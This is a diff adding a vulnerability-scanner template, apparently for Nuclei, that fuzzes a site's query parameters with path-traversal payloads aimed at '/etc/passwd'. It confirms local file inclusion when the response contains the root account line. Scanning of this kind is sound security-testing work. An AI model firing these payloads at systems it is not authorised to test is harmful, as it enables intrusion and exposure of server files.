@@ -1,0 +1,25 @@
+id: THENAWABX_FOUND_LFI
+info:
+  name: 📂 Nawab-Confirmed-LFI 📂
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      lfi_payloads:
+        - "/etc/passwd"
+        - "../../../../../etc/passwd"
+        - "/../../../../../../../../etc/passwd"
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{lfi_payloads}}"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
